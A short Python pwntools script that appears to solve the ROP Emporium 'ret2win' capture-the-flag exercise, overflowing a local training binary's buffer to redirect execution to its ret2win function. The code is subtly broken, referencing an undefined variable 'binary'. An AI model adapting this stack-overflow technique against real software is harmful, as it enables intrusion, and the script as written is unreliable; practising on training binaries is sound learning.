from pwn import * 

bin= '/home/kali/Downloads/ropemporium/challenge1/ret2win'
bin= ELF(bin)
context.binary= binary
context.log_level='info'

offset= cyclic_find('laaa')

ret2win= binary.symbols['ret2win']

payload= flat(b'A'* offset, ret2win)

p=process(bin.path)
p.sendline(payload)
p.interactive()
